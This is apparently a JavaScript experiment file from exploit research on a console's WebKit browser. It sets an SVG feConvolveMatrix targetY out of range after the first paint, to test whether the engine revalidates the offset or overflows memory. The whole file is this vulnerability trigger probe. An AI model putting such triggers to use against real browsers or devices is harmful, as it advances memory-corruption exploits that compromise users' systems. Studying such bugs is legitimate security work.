// feconv-look: make the #5 trigger visible on the console screen.
//
// feconv-1 armed the invalid target offset and survived with a clean scan, which
// is ambiguous in two ways the page cannot resolve from script:
//
//   * did the SVG filter applier run at all on this engine? (if it did not,
//     nothing can overflow and the clean scan means nothing)
//   * did the shipped binary revalidate the dynamic target offset and drop the
//     change? (the 2.54.2 row of docs/V19-BRANCH.md §9.2 reads exactly like
//     that: setter accepts, filter dropped, clean exit)
//
// Both are visible. Two identical 256x256 filters are placed side by side. Both
// are built with targetY=1 (valid for order 3) and an all-zero kernel plus
// bias 0.9, so a working applier renders a flat bright square:
//
//   left  (reference)  targetY stays 1  -> flat square means the applier ran
//   right (subject)    targetY armed to 45 after the first paint
//
// If the right square stays identical to the left one, the invalid offset was
// dropped (revalidated). If its top rows change, the effect really holds 45 and
// the applier is running with it. If the process dies, the overflow reached
// something that mattered.
//
// The page then holds still for `hold` ms (default 20 s) so the run can be
// captured from the dashboard: curl -s -o /tmp/x.jpg http://127.0.0.1:8777/preview.jpg
//
// Queue with:
//   sudo node tools/experiment.mjs enqueue feconv-look --label feconv-look-1
(function () {
  'use strict';
  if (typeof Ns2Webkit === 'undefined' || !Ns2Webkit.registerExperiment)
    throw new Error('feconv-look: Ns2Webkit.registerExperiment is missing');

  var HOLD_DEFAULT = 20000;

  function square(id, matrixId) {
    return '<svg xmlns="http://www.w3.org/2000/svg" width="256" height="256" ' +
      'style="position:absolute;left:' + (id === 'a' ? '0' : '284') + 'px;top:0">' +
      '<defs><filter id="' + id + 'f" filterUnits="userSpaceOnUse" x="0" y="0" ' +
      'width="256" height="256"><feConvolveMatrix id="' + matrixId +
      '" in="SourceGraphic" order="3" kernelMatrix="0 0 0 0 0 0 0 0 0" ' +
      'divisor="1" bias="0.9" targetX="0" targetY="1"></feConvolveMatrix>' +
      '</filter></defs><rect x="0" y="0" width="256" height="256" fill="#123456" ' +
      'filter="url(#' + id + 'f)"></rect></svg>';
  }

  Ns2Webkit.registerExperiment({
    name: 'feconv-look',
    description: 'feConvolveMatrix: is the filter applied, and is the dynamic target honoured?',
    run: function (params) {
      var args = (params && params.experimentArgs) || {};
      var targetY = Number(args.targetY);
      if (!isFinite(targetY) || targetY < 0) targetY = 45;
      var hold = Number(args.hold);
      if (!isFinite(hold) || hold < 0) hold = HOLD_DEFAULT;
      // Time between the first paint (with the valid offset) and arming the
      // invalid one. A capture taken inside this window shows the second square
      // still rendering, which is the reference the armed state is compared to.
      var armDelay = Number(args.armDelay);
      if (!isFinite(armDelay) || armDelay < 0) armDelay = 1200;

      var report = {
        targetY: targetY,
        hold: hold,
        armDelay: armDelay,
        built: false,
        armed: null,
        targetAfter: null,
        repaints: 0,
        out: 'not-run'
      };

      var host = document.createElement('div');
      host.setAttribute('id', 'feconv-look');
      host.style.cssText = 'position:absolute;left:16px;top:16px;width:560px;' +
        'height:280px;background:#000;z-index:9999';
      host.innerHTML = square('a', 'ma') + square('b', 'mb');
      document.body.appendChild(host);

      var matrix = host.querySelector('#mb');
      var svgs = host.querySelectorAll('svg');
      var rect = svgs && svgs[1] ? svgs[1].querySelector('rect') : null;
      report.built = !!matrix;

      if (!matrix || !rect) {
        report.out = 'the two filter squares did not build';
        return report;
      }

      return new Promise(function (resolve) {
        // One paint with the valid offset has to happen first: the effect is
        // created (and validated) at that point, and only then can the page
        // move the offset out of range without a rebuild.
        setTimeout(function () {
          try {
            report.armed = matrix.targetY ? 'baseVal' : 'attribute';
            if (matrix.targetY) matrix.targetY.baseVal = targetY;
            else matrix.setAttribute('targetY', String(targetY));
            report.targetAfter = matrix.targetY ? matrix.targetY.baseVal : null;
            rect.setAttribute('fill', '#654321');
            void host.getBoundingClientRect();
          } catch (error) {
            report.out = 'arming threw ' + error;
          }
          // Second paint, now with the invalid offset held by the effect.
          setTimeout(function () {
            try {
              rect.setAttribute('fill', '#123456');
              void host.getBoundingClientRect();
              report.repaints = 2;
            } catch (error) {
              report.out = 'repaint threw ' + error;
            }
            report.out = 'armed=' + report.armed + ' targetAfter=' + report.targetAfter +
              ' (left square is the reference; hold ' + hold + ' ms)';
            // Stay on screen, unchanged, so the capture has a stable target.
            setTimeout(function () { resolve(report); }, hold);
          }, 1200);
        }, armDelay);
      });
    }
  });
})();
